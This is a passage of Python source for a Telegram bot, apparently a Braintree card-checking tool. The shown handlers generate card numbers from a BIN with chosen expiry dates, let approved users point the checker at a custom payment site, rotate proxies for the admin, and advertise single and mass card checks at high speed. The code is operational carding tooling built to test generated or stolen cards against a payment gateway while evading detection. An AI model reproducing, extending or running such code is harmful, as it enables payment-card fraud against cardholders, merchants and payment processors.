        edit_safe(message.chat.id, status_msg.message_id, bin_response)
    except Exception as e:
        print(f"bin error: {e}")
        send_safe(message.chat.id, "❌ Error looking up BIN")

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            send_safe(message.chat.id, "Usage:\n/gen 453212 10\n/gen 453212|06|30 10")
            return
        
        bin_input = command_parts[1].strip()
        exp_month = exp_year = None
        
        if '|' in bin_input:
            parts = bin_input.split('|')
            bin_input = parts[0]
            if len(parts) >= 3:
                try:
                    exp_month = parts[1].strip()
                    exp_year = parts[2].strip()
                except:
                    pass
        
        bin_input = bin_input.replace('x', '').replace('X', '')
        bin_number = ''.join(c for c in bin_input if c.isdigit())
        
        quantity = 10
        if len(command_parts) > 2:
            try:
                quantity = int(command_parts[2])
            except:
                quantity = 10
        
        if not bin_number or len(bin_number) < 6:
            send_safe(message.chat.id, "❌ BIN must be at least 6 digits")
            return
        
        bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
        
        status_msg = send_safe(message.chat.id, f"🎲 Generating {quantity} cards...")
        
        cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
        if error:
            edit_safe(message.chat.id, status_msg.message_id, f"❌ Error: {error}")
            return
        
        user_sessions[message.chat.id] = {'generated_cards': cards}
        
        card_info = get_card_info(bin_number.ljust(16, '0'))
        date_info = "Random dates" if not exp_month else f"{exp_month}/{exp_year}"
        
        gen_response = "╔════════════════════════╗\n"
        gen_response += "║  🎲 GENERATED CARDS  ║\n"
        gen_response += "╚════════════════════════╝\n\n"
        gen_response += f"🔢 BIN: {bin_number}\n"
        gen_response += f"💳 {card_info.get('brand', 'Unknown')}\n"
        gen_response += f"{card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n"
        gen_response += f"🏦 {card_info.get('bank', 'Unknown')}\n"
        gen_response += f"📅 {date_info}\n"
        gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        gen_response += f"✨ {len(cards)} Cards\n"
        gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for card in cards:
            gen_response += f"💳 {card}\n"
        
        gen_response += "\n💡 Use /bchk or /bmass to check!"
        
        edit_safe(message.chat.id, status_msg.message_id, gen_response)
    except Exception as e:
        print(f"gen error: {e}")
        send_safe(message.chat.id, "❌ Error generating cards")

@bot.message_handler(commands=['custom_site'])
@require_approval
def custom_site_command(message):
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            send_safe(message.chat.id, "Usage:\n/custom_site https://yoursite.com")
            return
        
        site_url = command_parts[1].strip()
        
        if not site_url.startswith('http'):
            send_safe(message.chat.id, "❌ URL must start with http:// or https://")
            return
        
        user_custom_sites[message.chat.id] = site_url
        send_safe(message.chat.id, f"✅ Custom site set:\n{site_url}")
    except Exception as e:
        print(f"custom_site error: {e}")

@bot.message_handler(commands=['remove_site'])
@require_approval
def remove_site_command(message):
    try:
        if message.chat.id in user_custom_sites:
            del user_custom_sites[message.chat.id]
            send_safe(message.chat.id, "✅ Custom site removed")
        else:
            send_safe(message.chat.id, "ℹ️ Using default site")
    except Exception as e:
        print(f"remove_site error: {e}")

@bot.message_handler(commands=['site'])
@require_approval
def check_current_site(message):
    try:
        current_site = get_braintree_site(message.chat.id)
        is_custom = message.chat.id in user_custom_sites
        send_safe(message.chat.id, f"{'🔧 Custom' if is_custom else '📌 Default'} Site:\n{current_site}")
    except Exception as e:
        print(f"site error: {e}")

@bot.message_handler(commands=['proxy'])
def set_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            send_safe(message.chat.id, "Usage:\n/proxy http://user:pass@host:port")
            return
        
        proxy_url = command_parts[1].strip()
        status_msg = send_safe(message.chat.id, "⏳ Testing proxy...")
        success, msg = set_proxy(proxy_url)
        edit_safe(message.chat.id, status_msg.message_id, msg)
    except Exception as e:
        print(f"proxy error: {e}")
        send_safe(message.chat.id, f"❌ Error: {str(e)[:50]}")

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        send_safe(message.chat.id, remove_proxy())
    except Exception as e:
        print(f"removeproxy error: {e}")

@bot.message_handler(commands=['proxystatus'])
def proxy_status_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        with PROXY_LOCK:
            if ACTIVE_PROXY:
                send_safe(message.chat.id, f"🟢 Active\n🌐 {ACTIVE_PROXY}")
            else:
                send_safe(message.chat.id, "🔴 Not set")
    except Exception as e:
        print(f"proxystatus error: {e}")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        if not approved_users:
            send_safe(message.chat.id, "📭 No approved users")
            return
        text = "👥 Approved Users:\n\n"
        for idx, uid in enumerate(approved_users, 1):
            text += f"{idx}. 🆔 {uid}\n"
        send_safe(message.chat.id, text)
    except Exception as e:
        print(f"users error: {e}")

@bot.message_handler(commands=['pending'])
def list_pending_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        if not pending_requests:
            send_safe(message.chat.id, "📭 No pending requests")
            return
        text = "⏳ Pending Requests:\n\n"
        for user_id, info in pending_requests.items():
            text += f"👤 {info['name']}\n🔗 @{info['username']}\n🆔 {user_id}\n\n"
        send_safe(message.chat.id, text)
    except Exception as e:
        print(f"pending error: {e}")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            send_safe(message.chat.id, "Usage:\n/broadcast Your message")
            return
        
        broadcast_text = command_parts[1].strip()
        
        if not approved_users:
            send_safe(message.chat.id, "❌ No approved users")
            return
        
        status_msg = send_safe(message.chat.id, "📤 Broadcasting...")
        success_count = failed_count = 0
        
        for user_id in approved_users:
            try:
                send_safe(user_id, f"📢 ADMIN BROADCAST\n\n{broadcast_text}")
                success_count += 1
            except:
                failed_count += 1
            time.sleep(0.3)
        
        edit_safe(message.chat.id, status_msg.message_id, f"✅ Done!\n\n✅ Sent: {success_count}\n❌ Failed: {failed_count}")
    except Exception as e:
        print(f"broadcast error: {e}")

@bot.message_handler(commands=['help'])
@require_approval
def send_help(message):
    try:
        help_text = "📚 <b>COMMANDS</b>\n\n"
        help_text += "💳 /bchk card|mm|yy|cvv\n"
        help_text += "📦 /bmass [cards]\n"
        help_text += "📁 /bfile\n"
        help_text += "🔍 /bin 453212\n"
        help_text += "🎲 /gen 453212 5\n\n"
        help_text += "✨ Fast & Reliable!"
        send_safe(message.chat.id, help_text, parse_mode='HTML')
    except Exception as e:
        print(f"help error: {e}")

if __name__ == '__main__':
    print("🚀 Braintree Bot started!")
    print(f"⚡ SUPER FAST: {MAX_WORKERS} parallel workers")
    print(f"⏱️ Cooldowns: {COOLDOWN_CHECK}s check, {COOLDOWN_MASS}s mass")
    print(f"📦 Max cards: {MAX_MASS_CARDS} mass, {MAX_FILE_CARDS} file")
    print("✅ WebShare proxy format supported!")
    print("✅ Format: host:port:username:password")
    print("🔥 Optimized for SPEED - No retries, instant response!")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        time.sleep(5)
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
